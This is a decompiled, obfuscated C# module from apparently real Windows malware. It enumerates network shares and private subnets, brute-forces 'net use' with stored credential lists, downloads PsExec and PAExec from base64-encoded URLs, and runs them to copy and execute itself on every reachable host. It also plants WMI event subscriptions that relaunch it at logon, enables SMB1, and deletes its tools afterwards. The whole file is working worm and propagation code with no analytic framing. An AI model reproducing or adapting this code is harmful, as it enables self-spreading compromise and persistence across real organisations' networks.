using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace VsYjhNTIRPBh;

internal class YQPqSXHJqyd
{
	public class uDmAPAUMFJVPXy
	{
		public string NauuWocIjGyj { get; set; }
	}

	public enum XUHoNnwnlkwuQHq
	{
		OAVciFnuPwkaVy = 1,
		iBBhouvsAG,
		AewnKsBvYNafzSj,
		kckptYUMZWVap,
		hkSlXEVYMpqvau
	}

	public enum RwNwrjTyPEvIft
	{
		egFHkDqVPPCGm,
		PhnzQXWiSz,
		QQvYfSMfBefwv,
		FryYVDcqMEATo
	}

	public enum ojKkLymXKpG
	{
		wQFgfSmCgdZo = 1,
		ZJMxDyrFCrR = 2,
		HjCQCtINZJJX = 4,
		mBtrmjDyJNt = 8,
		BaDkPkpfArbY = 16,
		SMCuLwJQeErOl = 19
	}

	public enum nkAWMAIZvXAsnJ
	{
		waZtGkZwEVAMq,
		GLghcSKhJZa,
		ycdMgjdXyyPe,
		xouEpyfIZlc,
		VFtVgsUrcR,
		HLbHPDqthhnE,
		qHBKIvEfLSmTH,
		fAIkEuLlybH,
		YKSwmxpptayLY,
		mkWOSgwaXjvKWj,
		zBobmkLMUpyv,
		JWKCaLwNmTInWc
	}

	public class CkccyQqlzSGIg : IEnumerable
	{
		private enum hkOEjLidimji
		{
			tbWmCPWKFWCS = 0,
			uMZlyfAOdGsahaE = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private class toqFJyPsevqmxmxv
		{
			public XUHoNnwnlkwuQHq BULfOeuYdlpf;

			public RwNwrjTyPEvIft SZnHijqXimj;

			public nkAWMAIZvXAsnJ ABaEiwKBDPgN;

			public ojKkLymXKpG beFeVzOyhEP;

			public string aDIbDZNpYQaP;

			public string RMvltCqQFHL;

			public string yBpcsfFjnkIlEv;

			public string XHdgsfszkqkfsL;
		}

		private ArrayList GWINoVXynhiEj = new ArrayList();

		public int oflEyLgTNOxvEj => GWINoVXynhiEj.Count;

		[DllImport("Mpr.dll")]
		private static extern hkOEjLidimji WNetOpenEnumA(XUHoNnwnlkwuQHq dwScope, RwNwrjTyPEvIft dwType, ojKkLymXKpG dwUsage, toqFJyPsevqmxmxv p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern hkOEjLidimji WNetCloseEnum(IntPtr hEnum);

		[DllImport("Mpr.dll")]
		private static extern hkOEjLidimji WNetEnumResourceA(IntPtr hEnum, ref uint lpcCount, IntPtr buffer, ref uint lpBufferSize);

		private void EnumerateServers(toqFJyPsevqmxmxv pRsrc, XUHoNnwnlkwuQHq scope, RwNwrjTyPEvIft type, ojKkLymXKpG usage, nkAWMAIZvXAsnJ displayType)
		{
			uint lpBufferSize = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint lpcCount = 1u;
			if (WNetOpenEnumA(scope, type, usage, pRsrc, out lphEnum) == hkOEjLidimji.tbWmCPWKFWCS)
			{
				hkOEjLidimji hkOEjLidimji;
				do
				{
					hkOEjLidimji = WNetEnumResourceA(lphEnum, ref lpcCount, intPtr, ref lpBufferSize);
					switch (hkOEjLidimji)
					{
					case hkOEjLidimji.uMZlyfAOdGsahaE:
						continue;
					case hkOEjLidimji.tbWmCPWKFWCS:
						Marshal.PtrToStructure(intPtr, pRsrc);
						if (pRsrc.ABaEiwKBDPgN == displayType)
						{
							GWINoVXynhiEj.Add(pRsrc.RMvltCqQFHL);
						}
						if ((pRsrc.beFeVzOyhEP & ojKkLymXKpG.ZJMxDyrFCrR) == ojKkLymXKpG.ZJMxDyrFCrR)
						{
							EnumerateServers(pRsrc, scope, type, usage, displayType);
						}
						continue;
					}
					break;
				}
				while (hkOEjLidimji != hkOEjLidimji.uMZlyfAOdGsahaE);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public CkccyQqlzSGIg(XUHoNnwnlkwuQHq scope, RwNwrjTyPEvIft type, ojKkLymXKpG usage, nkAWMAIZvXAsnJ displayType)
		{
			toqFJyPsevqmxmxv pRsrc = new toqFJyPsevqmxmxv();
			EnumerateServers(pRsrc, scope, type, usage, displayType);
		}

		public IEnumerator GetEnumerator()
		{
			return GWINoVXynhiEj.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct bOXXXlREsJRQUQNu
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string nSAkUTKksELsMR;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string swuMAzgfxrbr;

		public uint QNNFpFsmEXVQMyys;

		public uint jQscDhLGTnuBM;

		public IntPtr qpaKyjJEnnvCVWFF;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct WfrDvgxwQvEN
	{
		public int QNNFpFsmEXVQMyys;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string lzSbfYRPzEoPObs;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string svtIuuOdtepmcehCu;
	}

	public struct FGiagdSyolJBqGr
	{
		public string qaxDQFetPDqA;

		public string[] ubywXsgOHPS;

		public FGiagdSyolJBqGr(string Name, string[] Target)
		{
			qaxDQFetPDqA = Name;
			ubywXsgOHPS = Target;
		}
	}

	[CompilerGenerated]
	private sealed class dLrYpnGPqREKW
	{
		public string adxxvaBCDEsmW;

		public string aqOkdOWqSzoTC;

		public void _003CRun_003Eb__1(string ip)
		{
			if ((!ip.StartsWith("10.") && !ip.StartsWith("172.") && !ip.StartsWith("192.168.") && !ip.Contains("")) || !fEjXrnGyxWHvYAi(ip))
			{
				return;
			}
			try
			{
				if (BdNzYJbFQkt.SNKAjREyohbYV == "YES")
				{
					for (int i = 0; i < IERxaHHSBUJR.Count; i++)
					{
						BdNzYJbFQkt.nDKKRmovEZDKb("net.exe", "use \\\\" + ip + " /USER:" + IERxaHHSBUJR[i] + " " + EtdLkkTnCofeUG[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					BdNzYJbFQkt.nDKKRmovEZDKb("net.exe", "use \\\\" + ip);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (BdNzYJbFQkt.SNKAjREyohbYV == "YES")
			{
				for (int j = 0; j < IERxaHHSBUJR.Count; j++)
				{
					if (BdNzYJbFQkt.IPEdelhHNhMeB)
					{
						if (File.Exists(adxxvaBCDEsmW))
						{
							BdNzYJbFQkt.nDKKRmovEZDKb(adxxvaBCDEsmW, "\\\\" + ip + " -u \"" + IERxaHHSBUJR[j] + "\" -p \"" + EtdLkkTnCofeUG[j] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(aqOkdOWqSzoTC))
					{
						BdNzYJbFQkt.nDKKRmovEZDKb(aqOkdOWqSzoTC, "\\\\" + ip + " -u \"" + IERxaHHSBUJR[j] + "\" -p \"" + EtdLkkTnCofeUG[j] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			}
			else if (BdNzYJbFQkt.IPEdelhHNhMeB)
			{
				if (File.Exists(adxxvaBCDEsmW))
				{
					BdNzYJbFQkt.nDKKRmovEZDKb(adxxvaBCDEsmW, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
				}
			}
			else if (File.Exists(aqOkdOWqSzoTC))
			{
				BdNzYJbFQkt.nDKKRmovEZDKb(aqOkdOWqSzoTC, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
			}
		}
	}

	[CompilerGenerated]
	private sealed class CoYprLyKoyPIkB
	{
		public string sGuuvGieWt;

		public bool _003CGetIPAddresses_003Eb__5(string o)
		{
			return o != sGuuvGieWt;
		}
	}

	private const int CwNpQCaBFJHBEn = 268435455;

	private const int tqsYHGZUDBbggC = 0;

	public static List<string> UmCCSNZKBdXWvKWF = new List<string>();

	public static string WndkphcgbWA = "";

	public static List<string> IERxaHHSBUJR = new List<string>();

	public static List<string> EtdLkkTnCofeUG = new List<string>();

	public static List<string> qxvwHkBEwuVixr = new List<string>();

	public static List<uDmAPAUMFJVPXy> TNIhdManWS()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net view";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<uDmAPAUMFJVPXy> list = new List<uDmAPAUMFJVPXy>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == "There are no entries in the list.")
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new uDmAPAUMFJVPXy
						{
							NauuWocIjGyj = "\\" + stringBuilder.ToString() + "\\Users"
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string WitIordgcVcITO, int sYDIRpmxwmx, int tcjGLDhEpxRYT, out IntPtr RoDpFonrfw, [MarshalAs(UnmanagedType.I4)] out int nhMNAzODKDBo, [MarshalAs(UnmanagedType.I4)] ref int VQlEeNmroKfRIG);

	public static List<FGiagdSyolJBqGr> PnSrVkCuJdXFd(string QFxovYPFABpWtU)
	{
		try
		{
			List<FGiagdSyolJBqGr> list = new List<FGiagdSyolJBqGr>();
			IntPtr RoDpFonrfw = default(IntPtr);
			int nhMNAzODKDBo = 0;
			int VQlEeNmroKfRIG = 0;
			if (NetDfsEnum(QFxovYPFABpWtU, 3, 268435455, out RoDpFonrfw, out nhMNAzODKDBo, ref VQlEeNmroKfRIG) == 0)
			{
				for (int i = 0; i < nhMNAzODKDBo; i++)
				{
					bOXXXlREsJRQUQNu bOXXXlREsJRQUQNu = (bOXXXlREsJRQUQNu)Marshal.PtrToStructure(RoDpFonrfw + i * Marshal.SizeOf(typeof(bOXXXlREsJRQUQNu)), typeof(bOXXXlREsJRQUQNu));
					if (bOXXXlREsJRQUQNu.nSAkUTKksELsMR == QFxovYPFABpWtU)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < bOXXXlREsJRQUQNu.jQscDhLGTnuBM; j++)
					{
						IntPtr ptr = new IntPtr(bOXXXlREsJRQUQNu.qpaKyjJEnnvCVWFF.ToInt64() + j * Marshal.SizeOf(typeof(WfrDvgxwQvEN)));
						WfrDvgxwQvEN wfrDvgxwQvEN = (WfrDvgxwQvEN)Marshal.PtrToStructure(ptr, typeof(WfrDvgxwQvEN));
						if (wfrDvgxwQvEN.QNNFpFsmEXVQMyys == 2)
						{
							list2.Add(Path.Combine(new string[3] { "\\\\", wfrDvgxwQvEN.lzSbfYRPzEoPObs, wfrDvgxwQvEN.svtIuuOdtepmcehCu }));
						}
					}
					string text = bOXXXlREsJRQUQNu.nSAkUTKksELsMR.Replace(QFxovYPFABpWtU, "");
					if (text.StartsWith("\\"))
					{
						text = text.Substring(1);
					}
					list.Add(new FGiagdSyolJBqGr(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void CwBfvRfgROR()
	{
		BdNzYJbFQkt.fxXZBqTtThkli("Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol");
		List<uDmAPAUMFJVPXy> list = TNIhdManWS();
		List<FGiagdSyolJBqGr> list2 = PnSrVkCuJdXFd(Environment.MachineName);
		if (list2 != null)
		{
			foreach (FGiagdSyolJBqGr item in list2)
			{
				string[] ubywXsgOHPS = item.ubywXsgOHPS;
				foreach (string text in ubywXsgOHPS)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (BdNzYJbFQkt.SNKAjREyohbYV == "YES")
						{
							for (int j = 0; j < IERxaHHSBUJR.Count; j++)
							{
								BdNzYJbFQkt.nDKKRmovEZDKb("net.exe", "use " + text + " /USER:" + IERxaHHSBUJR[j] + " " + EtdLkkTnCofeUG[j]);
							}
						}
						else
						{
							BdNzYJbFQkt.nDKKRmovEZDKb("net.exe", "use " + text);
						}
						BdNzYJbFQkt.jDiasrreCxZfH.Add(text.Replace("IPC$", ""));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (uDmAPAUMFJVPXy item2 in list)
		{
			if (item2.NauuWocIjGyj.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (BdNzYJbFQkt.SNKAjREyohbYV == "YES")
				{
					for (int k = 0; k < IERxaHHSBUJR.Count; k++)
					{
						BdNzYJbFQkt.nDKKRmovEZDKb("net.exe", "use " + item2.NauuWocIjGyj + " /USER:" + IERxaHHSBUJR[k] + " " + EtdLkkTnCofeUG[k]);
					}
				}
				else
				{
					BdNzYJbFQkt.nDKKRmovEZDKb("net.exe", "use " + item2.NauuWocIjGyj);
				}
				BdNzYJbFQkt.jDiasrreCxZfH.Add(item2.NauuWocIjGyj.Replace("IPC$", ""));
			}
			catch
			{
			}
		}
	}

	public static void gVOLUbzibrRTF(string WNkhXQdtPpUL, string QgihjCtIKAVPbiky, string zrKwifhOKpgP)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "\\\\" + WNkhXQdtPpUL + "\\root\\subscription";
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(QgihjCtIKAVPbiky);
			val2.get_Options().set_Password(zrKwifhOKpgP);
			val2.get_Options().set_Authority(string.Format("ntlmdomain:{0}", "."));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath("__EventFilter"), (ObjectGetOptions)null);
			string text2 = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item("Name", (object)"WorkerFilter");
			((ManagementBaseObject)val5).set_Item("Query", (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item("QueryLanguage", (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item("EventNameSpace", (object)"root\\cimv2");
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath("CommandLineEventConsumer"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item("Name", (object)"EventConsumer");
			((ManagementBaseObject)val6).set_Item("ExecutablePath", (object)("\\\\" + WNkhXQdtPpUL + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath("__FilterToConsumerBinding"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item("Filter", (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item("Consumer", (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void bLysXhrmDXj()
	{
		List<dxZFSZKSUoJZ> list = dxZFSZKSUoJZ.QBIcfPSwIUAKfh();
		foreach (dxZFSZKSUoJZ item in list)
		{
			UmCCSNZKBdXWvKWF.Add(item.IWNFVgDTwOXS);
		}
		string adxxvaBCDEsmW = "";
		string aqOkdOWqSzoTC = "";
		try
		{
			adxxvaBCDEsmW = CSuLwYTQScFt();
		}
		catch
		{
		}
		try
		{
			aqOkdOWqSzoTC = zmHjtFbDMsVAf();
		}
		catch
		{
		}
		foreach (dxZFSZKSUoJZ item2 in list)
		{
			try
			{
				if (item2.IWNFVgDTwOXS.StartsWith("10.") || item2.IWNFVgDTwOXS.StartsWith("172.") || item2.IWNFVgDTwOXS.StartsWith("192.168.") || item2.IWNFVgDTwOXS.Contains(""))
				{
					zFBneKvqycHBpk.kYmOWMVDdqCT(item2.ocfoMLpaQOG, item2.IWNFVgDTwOXS, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(UmCCSNZKBdXWvKWF, delegate(string ip)
			{
				if ((ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("192.168.") || ip.Contains("")) && fEjXrnGyxWHvYAi(ip))
				{
					try
					{
						if (BdNzYJbFQkt.SNKAjREyohbYV == "YES")
						{
							for (int i = 0; i < IERxaHHSBUJR.Count; i++)
							{
								BdNzYJbFQkt.nDKKRmovEZDKb("net.exe", "use \\\\" + ip + " /USER:" + IERxaHHSBUJR[i] + " " + EtdLkkTnCofeUG[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							BdNzYJbFQkt.nDKKRmovEZDKb("net.exe", "use \\\\" + ip);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (BdNzYJbFQkt.SNKAjREyohbYV == "YES")
					{
						for (int j = 0; j < IERxaHHSBUJR.Count; j++)
						{
							if (BdNzYJbFQkt.IPEdelhHNhMeB)
							{
								if (File.Exists(adxxvaBCDEsmW))
								{
									BdNzYJbFQkt.nDKKRmovEZDKb(adxxvaBCDEsmW, "\\\\" + ip + " -u \"" + IERxaHHSBUJR[j] + "\" -p \"" + EtdLkkTnCofeUG[j] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(aqOkdOWqSzoTC))
							{
								BdNzYJbFQkt.nDKKRmovEZDKb(aqOkdOWqSzoTC, "\\\\" + ip + " -u \"" + IERxaHHSBUJR[j] + "\" -p \"" + EtdLkkTnCofeUG[j] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (BdNzYJbFQkt.IPEdelhHNhMeB)
					{
						if (File.Exists(adxxvaBCDEsmW))
						{
							BdNzYJbFQkt.nDKKRmovEZDKb(adxxvaBCDEsmW, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(aqOkdOWqSzoTC))
					{
						BdNzYJbFQkt.nDKKRmovEZDKb(aqOkdOWqSzoTC, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(adxxvaBCDEsmW))
			{
				File.Delete(adxxvaBCDEsmW);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(aqOkdOWqSzoTC))
			{
				File.Delete(aqOkdOWqSzoTC);
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> nmCmisQbYlZBJnXO()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string CSuLwYTQScFt()
	{
		if (IntPtr.Size == 8)
		{
			return LVYKTaNjSqdcVa(new Uri(BdNzYJbFQkt.bRWwIGxQDNUf("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return LVYKTaNjSqdcVa(new Uri(BdNzYJbFQkt.bRWwIGxQDNUf("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string zmHjtFbDMsVAf()
	{
		if (IntPtr.Size == 8)
		{
			return LVYKTaNjSqdcVa(new Uri(BdNzYJbFQkt.bRWwIGxQDNUf("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return LVYKTaNjSqdcVa(new Uri(BdNzYJbFQkt.bRWwIGxQDNUf("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool fEjXrnGyxWHvYAi(string PZautDiUtSaXT)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(PZautDiUtSaXT);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string LVYKTaNjSqdcVa(Uri DmDMvuDWCeh)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(DmDMvuDWCeh, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> RRwpkKSJqgBNVS()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			foreach (string sGuuvGieWt in array4)
			{
				if (sGuuvGieWt.Contains(":"))
				{
					array = array.Where((string o) => o != sGuuvGieWt).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
